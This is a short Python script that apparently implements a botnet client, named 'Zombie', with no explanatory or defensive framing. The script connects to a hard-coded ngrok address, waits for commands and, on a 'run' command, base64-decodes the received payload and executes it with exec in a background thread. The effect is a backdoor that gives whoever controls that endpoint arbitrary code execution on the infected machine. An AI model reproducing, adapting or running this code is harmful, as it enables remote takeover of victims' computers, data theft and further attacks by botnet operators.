import base64, socket, threading
import time, random

class Zombie:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def connect_socket(self):
        self.sock.connect(('2.tcp.ngrok.io', 10142))

    def send_packet(self, content: str):
        try:
            self.sock.send(content.encode('utf-8'))
            return True
        except:
            return False

    def recv_packet(self):
        try:
            data = self.sock.recv(4096).decode('utf-8').strip().split('\n')[0]
        
            if data not in ['']:
                return data

        except:
            return False

    def exec_payload(self, payload: str):
        threading.Thread(target= exec, args=(payload, {'threading': threading, 'socket': socket, 'time': time, 'random': random})).start()

    def run(self):
        self.connect_socket()

        while True:
            cmd = self.recv_packet()

            if '|' in cmd:
                argument = cmd.split('|')
                command = argument[0]

                if command == 'run':
                    payload = base64.b64decode(str(argument[1])[2:].replace("'", '')).decode('utf-8')
                    print(payload)
                    self.exec_payload(payload)

Zombie().run()